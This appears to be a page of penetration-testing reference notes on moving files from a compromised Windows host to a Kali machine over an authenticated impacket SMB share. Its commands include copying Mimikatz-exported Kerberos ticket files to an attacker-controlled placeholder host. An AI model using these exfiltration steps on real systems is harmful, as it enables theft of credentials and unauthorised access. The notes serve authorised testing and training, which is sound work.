# File transfer

[← Foothold quick reference](../02-foothold.md)

The [quick reference](../02-foothold.md#file-transfer) has HTTP, SMB, `wget`, `curl`, `certutil`, and PowerShell download commands. These are the extra checks for Windows-to-Kali copies.

## Authenticated SMB share

On Kali, share the directory where the file should land:

```bash
sudo impacket-smbserver share . -smb2support -user <share-user> -password '<share-password>'
```

From Windows, map the named share and copy to that share name, not just the server root:

```cmd
net use \\<KALI-IP>\share /user:<share-user> <share-password>
copy C:\Temp\file.bin \\<KALI-IP>\share\file.bin
```

`net view \\<KALI-IP>` shows advertised shares; it does not prove the current account can write to one. Check the copied file on Kali.

## PowerShell paths containing brackets

Mimikatz ticket exports can contain `[` and `]`. PowerShell's ordinary `-Path` treats them as wildcard characters. Use `-LiteralPath` and rename the destination:

```powershell
Copy-Item -LiteralPath 'C:\Temp\[ticket-id]-user@service.kirbi' `
  -Destination '\\<KALI-IP>\share\ticket.kirbi' -ErrorAction Stop
Test-Path -LiteralPath '\\<KALI-IP>\share\ticket.kirbi'
```

If a transfer over `/dev/tcp` returns an HTTP response, strip its headers before treating the body as a file. Verify the length or checksum before running a transferred binary.
